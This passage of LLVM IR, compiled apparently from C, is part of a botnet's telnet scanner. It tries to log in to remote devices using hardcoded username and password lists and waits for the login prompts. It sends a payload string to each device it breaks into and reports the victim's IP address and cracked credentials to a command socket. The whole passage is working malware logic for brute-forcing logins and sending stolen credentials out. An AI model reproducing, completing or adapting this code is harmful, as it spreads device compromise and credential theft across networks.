  %1773 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1772
  %1774 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1773, i32 0, i32 0
  %1775 = load i32, i32* %1774, align 16
  %1776 = call i32 @sclose(i32 %1775)
  %1777 = load i32, i32* %2, align 4
  %1778 = sext i32 %1777 to i64
  %1779 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1778
  %1780 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1779, i32 0, i32 2
  store i8 0, i8* %1780, align 8
  %1781 = load i32, i32* %2, align 4
  %1782 = sext i32 %1781 to i64
  %1783 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1782
  %1784 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1783, i32 0, i32 3
  store i8 0, i8* %1784, align 1
  br label %2264

; <label>:1785:                                   ; preds = %1749
  %1786 = load i32, i32* %2, align 4
  %1787 = sext i32 %1786 to i64
  %1788 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1787
  %1789 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1788, i32 0, i32 2
  store i8 7, i8* %1789, align 8
  br label %1790

; <label>:1790:                                   ; preds = %1785
  %1791 = load i32, i32* %2, align 4
  %1792 = sext i32 %1791 to i64
  %1793 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1792
  %1794 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1793, i32 0, i32 8
  %1795 = load i8*, i8** %1794, align 8
  call void @llvm.memset.p0i8.i64(i8* %1795, i8 0, i64 1024, i32 1, i1 false)
  br label %2264

; <label>:1796:                                   ; preds = %1730
  %1797 = load i32, i32* %2, align 4
  %1798 = sext i32 %1797 to i64
  %1799 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1798
  %1800 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1799, i32 0, i32 0
  %1801 = load i32, i32* %1800, align 16
  %1802 = load i32, i32* %2, align 4
  %1803 = sext i32 %1802 to i64
  %1804 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1803
  %1805 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1804, i32 0, i32 8
  %1806 = load i8*, i8** %1805, align 8
  %1807 = load i32, i32* %2, align 4
  %1808 = sext i32 %1807 to i64
  %1809 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1808
  %1810 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1809, i32 0, i32 7
  %1811 = load i16, i16* %1810, align 16
  %1812 = zext i16 %1811 to i32
  %1813 = call i32 @readUntil(i32 %1801, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.71, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1806, i32 1024, i32 %1812)
  %1814 = icmp ne i32 %1813, 0
  br i1 %1814, label %1815, label %1862

; <label>:1815:                                   ; preds = %1796
  %1816 = load i32, i32* %2, align 4
  %1817 = sext i32 %1816 to i64
  %1818 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1817
  %1819 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1818, i32 0, i32 6
  store i32 0, i32* %1819, align 4
  %1820 = load i32, i32* %2, align 4
  %1821 = sext i32 %1820 to i64
  %1822 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1821
  %1823 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1822, i32 0, i32 7
  store i16 0, i16* %1823, align 16
  %1824 = load i32, i32* %2, align 4
  %1825 = sext i32 %1824 to i64
  %1826 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1825
  %1827 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1826, i32 0, i32 8
  %1828 = load i8*, i8** %1827, align 8
  %1829 = call i8* @strstr(i8* %1828, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.71, i32 0, i32 0)) #10
  %1830 = icmp ne i8* %1829, null
  br i1 %1830, label %1831, label %1851

; <label>:1831:                                   ; preds = %1815
  %1832 = load i32, i32* %2, align 4
  %1833 = sext i32 %1832 to i64
  %1834 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1833
  %1835 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1834, i32 0, i32 8
  %1836 = load i8*, i8** %1835, align 8
  call void @llvm.memset.p0i8.i64(i8* %1836, i8 0, i64 1024, i32 1, i1 false)
  %1837 = load i32, i32* %2, align 4
  %1838 = sext i32 %1837 to i64
  %1839 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1838
  %1840 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1839, i32 0, i32 0
  %1841 = load i32, i32* %1840, align 16
  %1842 = call i32 @sclose(i32 %1841)
  %1843 = load i32, i32* %2, align 4
  %1844 = sext i32 %1843 to i64
  %1845 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1844
  %1846 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1845, i32 0, i32 2
  store i8 0, i8* %1846, align 8
  %1847 = load i32, i32* %2, align 4
  %1848 = sext i32 %1847 to i64
  %1849 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1848
  %1850 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1849, i32 0, i32 3
  store i8 0, i8* %1850, align 1
  br label %2264

; <label>:1851:                                   ; preds = %1815
  %1852 = load i32, i32* %2, align 4
  %1853 = sext i32 %1852 to i64
  %1854 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1853
  %1855 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1854, i32 0, i32 2
  store i8 7, i8* %1855, align 8
  br label %1856

; <label>:1856:                                   ; preds = %1851
  %1857 = load i32, i32* %2, align 4
  %1858 = sext i32 %1857 to i64
  %1859 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1858
  %1860 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1859, i32 0, i32 8
  %1861 = load i8*, i8** %1860, align 8
  call void @llvm.memset.p0i8.i64(i8* %1861, i8 0, i64 1024, i32 1, i1 false)
  br label %2264

; <label>:1862:                                   ; preds = %1796
  %1863 = load i32, i32* %2, align 4
  %1864 = sext i32 %1863 to i64
  %1865 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1864
  %1866 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1865, i32 0, i32 8
  %1867 = load i8*, i8** %1866, align 8
  %1868 = call i64 @strlen(i8* %1867) #10
  %1869 = trunc i64 %1868 to i16
  %1870 = load i32, i32* %2, align 4
  %1871 = sext i32 %1870 to i64
  %1872 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1871
  %1873 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1872, i32 0, i32 7
  store i16 %1869, i16* %1873, align 16
  br label %1874

; <label>:1874:                                   ; preds = %1862
  %1875 = load i32, i32* %2, align 4
  %1876 = sext i32 %1875 to i64
  %1877 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1876
  %1878 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1877, i32 0, i32 6
  %1879 = load i32, i32* %1878, align 4
  %1880 = add i32 %1879, 10
  %1881 = zext i32 %1880 to i64
  %1882 = call i64 @time(i64* null) #2
  %1883 = icmp slt i64 %1881, %1882
  br i1 %1883, label %1884, label %1899

; <label>:1884:                                   ; preds = %1874
  %1885 = load i32, i32* %2, align 4
  %1886 = sext i32 %1885 to i64
  %1887 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1886
  %1888 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1887, i32 0, i32 0
  %1889 = load i32, i32* %1888, align 16
  %1890 = call i32 @sclose(i32 %1889)
  %1891 = load i32, i32* %2, align 4
  %1892 = sext i32 %1891 to i64
  %1893 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1892
  %1894 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1893, i32 0, i32 2
  store i8 0, i8* %1894, align 8
  %1895 = load i32, i32* %2, align 4
  %1896 = sext i32 %1895 to i64
  %1897 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1896
  %1898 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1897, i32 0, i32 3
  store i8 1, i8* %1898, align 1
  br label %1899

; <label>:1899:                                   ; preds = %1884, %1874
  br label %2263

; <label>:1900:                                   ; preds = %68
  %1901 = load i32, i32* %2, align 4
  %1902 = sext i32 %1901 to i64
  %1903 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1902
  %1904 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1903, i32 0, i32 0
  %1905 = load i32, i32* %1904, align 16
  %1906 = call i64 @send(i32 %1905, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.72, i32 0, i32 0), i64 4, i32 16384)
  %1907 = icmp slt i64 %1906, 0
  br i1 %1907, label %1908, label %1923

; <label>:1908:                                   ; preds = %1900
  %1909 = load i32, i32* %2, align 4
  %1910 = sext i32 %1909 to i64
  %1911 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1910
  %1912 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1911, i32 0, i32 0
  %1913 = load i32, i32* %1912, align 16
  %1914 = call i32 @sclose(i32 %1913)
  %1915 = load i32, i32* %2, align 4
  %1916 = sext i32 %1915 to i64
  %1917 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1916
  %1918 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1917, i32 0, i32 2
  store i8 0, i8* %1918, align 8
  %1919 = load i32, i32* %2, align 4
  %1920 = sext i32 %1919 to i64
  %1921 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1920
  %1922 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1921, i32 0, i32 3
  store i8 1, i8* %1922, align 1
  br label %2264

; <label>:1923:                                   ; preds = %1900
  %1924 = load i32, i32* %2, align 4
  %1925 = sext i32 %1924 to i64
  %1926 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1925
  %1927 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1926, i32 0, i32 2
  store i8 8, i8* %1927, align 8
  br label %2263

; <label>:1928:                                   ; preds = %68
  %1929 = load i32, i32* %2, align 4
  %1930 = sext i32 %1929 to i64
  %1931 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1930
  %1932 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1931, i32 0, i32 0
  %1933 = load i32, i32* %1932, align 16
  %1934 = call i64 @send(i32 %1933, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.80, i32 0, i32 0), i64 9, i32 16384)
  %1935 = icmp slt i64 %1934, 0
  br i1 %1935, label %1936, label %1951

; <label>:1936:                                   ; preds = %1928
  %1937 = load i32, i32* %2, align 4
  %1938 = sext i32 %1937 to i64
  %1939 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1938
  %1940 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1939, i32 0, i32 0
  %1941 = load i32, i32* %1940, align 16
  %1942 = call i32 @sclose(i32 %1941)
  %1943 = load i32, i32* %2, align 4
  %1944 = sext i32 %1943 to i64
  %1945 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1944
  %1946 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1945, i32 0, i32 2
  store i8 0, i8* %1946, align 8
  %1947 = load i32, i32* %2, align 4
  %1948 = sext i32 %1947 to i64
  %1949 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1948
  %1950 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1949, i32 0, i32 3
  store i8 1, i8* %1950, align 1
  br label %2264

; <label>:1951:                                   ; preds = %1928
  %1952 = load i32, i32* %2, align 4
  %1953 = sext i32 %1952 to i64
  %1954 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1953
  %1955 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1954, i32 0, i32 2
  store i8 9, i8* %1955, align 8
  br label %2263

; <label>:1956:                                   ; preds = %68
  %1957 = load i32, i32* %2, align 4
  %1958 = sext i32 %1957 to i64
  %1959 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1958
  %1960 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1959, i32 0, i32 0
  %1961 = load i32, i32* %1960, align 16
  %1962 = call i64 @send(i32 %1961, i8* getelementptr inbounds ([375 x i8], [375 x i8]* @.str, i32 0, i32 0), i64 394, i32 16384)
  %1963 = icmp slt i64 %1962, 0
  br i1 %1963, label %1964, label %1979

; <label>:1964:                                   ; preds = %1956
  %1965 = load i32, i32* %2, align 4
  %1966 = sext i32 %1965 to i64
  %1967 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1966
  %1968 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1967, i32 0, i32 0
  %1969 = load i32, i32* %1968, align 16
  %1970 = call i32 @sclose(i32 %1969)
  %1971 = load i32, i32* %2, align 4
  %1972 = sext i32 %1971 to i64
  %1973 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1972
  %1974 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1973, i32 0, i32 2
  store i8 0, i8* %1974, align 8
  %1975 = load i32, i32* %2, align 4
  %1976 = sext i32 %1975 to i64
  %1977 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1976
  %1978 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1977, i32 0, i32 3
  store i8 1, i8* %1978, align 1
  br label %2264

; <label>:1979:                                   ; preds = %1956
  %1980 = load i32, i32* @mainCommSock, align 4
  %1981 = load i32, i32* %2, align 4
  %1982 = sext i32 %1981 to i64
  %1983 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1982
  %1984 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1983, i32 0, i32 1
  %1985 = bitcast i32* %1984 to %struct.in_addr*
  %1986 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %1985, i32 0, i32 0
  %1987 = load i32, i32* %1986, align 4
  %1988 = call i8* @inet_ntoa(i32 %1987) #2
  %1989 = load i32, i32* %2, align 4
  %1990 = sext i32 %1989 to i64
  %1991 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1990
  %1992 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1991, i32 0, i32 4
  %1993 = load i8, i8* %1992, align 2
  %1994 = zext i8 %1993 to i64
  %1995 = getelementptr inbounds [4 x i8*], [4 x i8*]* @usernames, i64 0, i64 %1994
  %1996 = load i8*, i8** %1995, align 8
  %1997 = load i32, i32* %2, align 4
  %1998 = sext i32 %1997 to i64
  %1999 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1998
  %2000 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1999, i32 0, i32 5
  %2001 = load i8, i8* %2000, align 1
  %2002 = zext i8 %2001 to i64
  %2003 = getelementptr inbounds [13 x i8*], [13 x i8*]* @passwords, i64 0, i64 %2002
  %2004 = load i8*, i8** %2003, align 8
  %2005 = call i32 (i32, i8*, ...) @sockprintf(i32 %1980, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.74, i32 0, i32 0), i8* %1988, i8* %1996, i8* %2004)
  %2006 = load i32, i32* %2, align 4
  %2007 = sext i32 %2006 to i64
  %2008 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2007
  %2009 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2008, i32 0, i32 2
  store i8 10, i8* %2009, align 8
  br label %2263

; <label>:2010:                                   ; preds = %68
  %2011 = load i32, i32* %2, align 4
  %2012 = sext i32 %2011 to i64
  %2013 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2012
  %2014 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2013, i32 0, i32 6
  %2015 = load i32, i32* %2014, align 4
  %2016 = icmp eq i32 %2015, 0
  br i1 %2016, label %2017, label %2024

; <label>:2017:                                   ; preds = %2010
  %2018 = call i64 @time(i64* null) #2
  %2019 = trunc i64 %2018 to i32
  %2020 = load i32, i32* %2, align 4
  %2021 = sext i32 %2020 to i64
  %2022 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2021
  %2023 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2022, i32 0, i32 6
  store i32 %2019, i32* %2023, align 4
  br label %2024

; <label>:2024:                                   ; preds = %2017, %2010
  %2025 = load i32, i32* %2, align 4
  %2026 = sext i32 %2025 to i64
  %2027 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2026
  %2028 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2027, i32 0, i32 0
  %2029 = load i32, i32* %2028, align 16
  %2030 = load i32, i32* %2, align 4
  %2031 = sext i32 %2030 to i64
  %2032 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2031
  %2033 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2032, i32 0, i32 8
  %2034 = load i8*, i8** %2033, align 8
  %2035 = load i32, i32* %2, align 4
  %2036 = sext i32 %2035 to i64
  %2037 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2036
  %2038 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2037, i32 0, i32 7
  %2039 = load i16, i16* %2038, align 16
  %2040 = zext i16 %2039 to i32
  %2041 = call i32 @readUntil(i32 %2029, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.77, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %2034, i32 1024, i32 %2040)
  %2042 = icmp ne i32 %2041, 0
  br i1 %2042, label %2043, label %2084

; <label>:2043:                                   ; preds = %2024
  %2044 = load i32, i32* %2, align 4
  %2045 = sext i32 %2044 to i64
  %2046 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2045
  %2047 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2046, i32 0, i32 6
  store i32 0, i32* %2047, align 4
  %2048 = load i32, i32* %2, align 4
  %2049 = sext i32 %2048 to i64
  %2050 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2049
  %2051 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2050, i32 0, i32 7
  store i16 0, i16* %2051, align 16
  %2052 = load i32, i32* %2, align 4
  %2053 = sext i32 %2052 to i64
  %2054 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2053
  %2055 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2054, i32 0, i32 0
  %2056 = load i32, i32* %2055, align 16
  %2057 = call i64 @send(i32 %2056, i8* getelementptr inbounds ([375 x i8], [375 x i8]* @.str, i32 0, i32 0), i64 394, i32 16384)
  %2058 = load i32, i32* @mainCommSock, align 4
  %2059 = load i32, i32* %2, align 4
  %2060 = sext i32 %2059 to i64
  %2061 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2060
  %2062 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2061, i32 0, i32 1
  %2063 = bitcast i32* %2062 to %struct.in_addr*
  %2064 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %2063, i32 0, i32 0
  %2065 = load i32, i32* %2064, align 4
  %2066 = call i8* @inet_ntoa(i32 %2065) #2
  %2067 = load i32, i32* %2, align 4
  %2068 = sext i32 %2067 to i64
  %2069 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2068
  %2070 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2069, i32 0, i32 4
  %2071 = load i8, i8* %2070, align 2
  %2072 = zext i8 %2071 to i64
  %2073 = getelementptr inbounds [4 x i8*], [4 x i8*]* @usernames, i64 0, i64 %2072
  %2074 = load i8*, i8** %2073, align 8
  %2075 = load i32, i32* %2, align 4
  %2076 = sext i32 %2075 to i64
  %2077 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2076
  %2078 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2077, i32 0, i32 5
  %2079 = load i8, i8* %2078, align 1
  %2080 = zext i8 %2079 to i64
  %2081 = getelementptr inbounds [13 x i8*], [13 x i8*]* @passwords, i64 0, i64 %2080
  %2082 = load i8*, i8** %2081, align 8
  %2083 = call i32 (i32, i8*, ...) @sockprintf(i32 %2058, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.74, i32 0, i32 0), i8* %2066, i8* %2074, i8* %2082)
  br label %2264

; <label>:2084:                                   ; preds = %2024
  %2085 = load i32, i32* %2, align 4
  %2086 = sext i32 %2085 to i64
  %2087 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2086
  %2088 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2087, i32 0, i32 0
  %2089 = load i32, i32* %2088, align 16
  %2090 = load i32, i32* %2, align 4
  %2091 = sext i32 %2090 to i64
  %2092 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2091
  %2093 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2092, i32 0, i32 8
  %2094 = load i8*, i8** %2093, align 8
  %2095 = load i32, i32* %2, align 4
  %2096 = sext i32 %2095 to i64
  %2097 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2096
  %2098 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2097, i32 0, i32 7
  %2099 = load i16, i16* %2098, align 16
  %2100 = zext i16 %2099 to i32
  %2101 = call i32 @readUntil(i32 %2089, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.78, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %2094, i32 1024, i32 %2100)
  %2102 = icmp ne i32 %2101, 0
  br i1 %2102, label %2103, label %2144

; <label>:2103:                                   ; preds = %2084
  %2104 = load i32, i32* %2, align 4
  %2105 = sext i32 %2104 to i64
  %2106 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2105
  %2107 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2106, i32 0, i32 6
  store i32 0, i32* %2107, align 4
  %2108 = load i32, i32* %2, align 4
  %2109 = sext i32 %2108 to i64
  %2110 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2109
  %2111 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2110, i32 0, i32 7
  store i16 0, i16* %2111, align 16
  %2112 = load i32, i32* %2, align 4
  %2113 = sext i32 %2112 to i64
  %2114 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2113
  %2115 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2114, i32 0, i32 0
  %2116 = load i32, i32* %2115, align 16
  %2117 = call i64 @send(i32 %2116, i8* getelementptr inbounds ([375 x i8], [375 x i8]* @.str, i32 0, i32 0), i64 394, i32 16384)
  %2118 = load i32, i32* @mainCommSock, align 4
  %2119 = load i32, i32* %2, align 4
  %2120 = sext i32 %2119 to i64
  %2121 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2120
  %2122 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2121, i32 0, i32 1
  %2123 = bitcast i32* %2122 to %struct.in_addr*
  %2124 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %2123, i32 0, i32 0
  %2125 = load i32, i32* %2124, align 4
  %2126 = call i8* @inet_ntoa(i32 %2125) #2
  %2127 = load i32, i32* %2, align 4
  %2128 = sext i32 %2127 to i64
  %2129 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2128
  %2130 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2129, i32 0, i32 4
  %2131 = load i8, i8* %2130, align 2
  %2132 = zext i8 %2131 to i64
  %2133 = getelementptr inbounds [4 x i8*], [4 x i8*]* @usernames, i64 0, i64 %2132
  %2134 = load i8*, i8** %2133, align 8
  %2135 = load i32, i32* %2, align 4
  %2136 = sext i32 %2135 to i64
  %2137 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2136
  %2138 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2137, i32 0, i32 5
  %2139 = load i8, i8* %2138, align 1
  %2140 = zext i8 %2139 to i64
  %2141 = getelementptr inbounds [13 x i8*], [13 x i8*]* @passwords, i64 0, i64 %2140
  %2142 = load i8*, i8** %2141, align 8
  %2143 = call i32 (i32, i8*, ...) @sockprintf(i32 %2118, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.74, i32 0, i32 0), i8* %2126, i8* %2134, i8* %2142)
  br label %2264

; <label>:2144:                                   ; preds = %2084
  %2145 = load i32, i32* %2, align 4
  %2146 = sext i32 %2145 to i64
  %2147 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2146
  %2148 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2147, i32 0, i32 0
  %2149 = load i32, i32* %2148, align 16
  %2150 = load i32, i32* %2, align 4
  %2151 = sext i32 %2150 to i64
  %2152 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2151
  %2153 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2152, i32 0, i32 8
  %2154 = load i8*, i8** %2153, align 8
  %2155 = load i32, i32* %2, align 4
  %2156 = sext i32 %2155 to i64
  %2157 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2156
  %2158 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2157, i32 0, i32 7
  %2159 = load i16, i16* %2158, align 16
  %2160 = zext i16 %2159 to i32
  %2161 = call i32 @readUntil(i32 %2149, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.79, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %2154, i32 1024, i32 %2160)
  %2162 = icmp ne i32 %2161, 0
  br i1 %2162, label %2163, label %2223

; <label>:2163:                                   ; preds = %2144
  %2164 = load i32, i32* %2, align 4
  %2165 = sext i32 %2164 to i64
  %2166 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2165
  %2167 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2166, i32 0, i32 6
  store i32 0, i32* %2167, align 4
  %2168 = load i32, i32* %2, align 4
  %2169 = sext i32 %2168 to i64
  %2170 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2169
  %2171 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2170, i32 0, i32 7
  store i16 0, i16* %2171, align 16
  %2172 = load i32, i32* %2, align 4
  %2173 = sext i32 %2172 to i64
  %2174 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2173
  %2175 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2174, i32 0, i32 0
  %2176 = load i32, i32* %2175, align 16
  %2177 = call i64 @send(i32 %2176, i8* getelementptr inbounds ([375 x i8], [375 x i8]* @.str, i32 0, i32 0), i64 394, i32 16384)
  %2178 = load i32, i32* @mainCommSock, align 4
  %2179 = load i32, i32* %2, align 4
  %2180 = sext i32 %2179 to i64
  %2181 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2180
  %2182 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2181, i32 0, i32 1
  %2183 = bitcast i32* %2182 to %struct.in_addr*
  %2184 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %2183, i32 0, i32 0
  %2185 = load i32, i32* %2184, align 4
  %2186 = call i8* @inet_ntoa(i32 %2185) #2
  %2187 = load i32, i32* %2, align 4
  %2188 = sext i32 %2187 to i64
  %2189 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2188
  %2190 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2189, i32 0, i32 4
  %2191 = load i8, i8* %2190, align 2
  %2192 = zext i8 %2191 to i64
  %2193 = getelementptr inbounds [4 x i8*], [4 x i8*]* @usernames, i64 0, i64 %2192
  %2194 = load i8*, i8** %2193, align 8
  %2195 = load i32, i32* %2, align 4
  %2196 = sext i32 %2195 to i64
  %2197 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2196
  %2198 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2197, i32 0, i32 5
  %2199 = load i8, i8* %2198, align 1
  %2200 = zext i8 %2199 to i64
  %2201 = getelementptr inbounds [13 x i8*], [13 x i8*]* @passwords, i64 0, i64 %2200
  %2202 = load i8*, i8** %2201, align 8
  %2203 = call i32 (i32, i8*, ...) @sockprintf(i32 %2178, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.74, i32 0, i32 0), i8* %2186, i8* %2194, i8* %2202)
  %2204 = load i32, i32* %2, align 4
  %2205 = sext i32 %2204 to i64
  %2206 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2205
  %2207 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2206, i32 0, i32 8
  %2208 = load i8*, i8** %2207, align 8
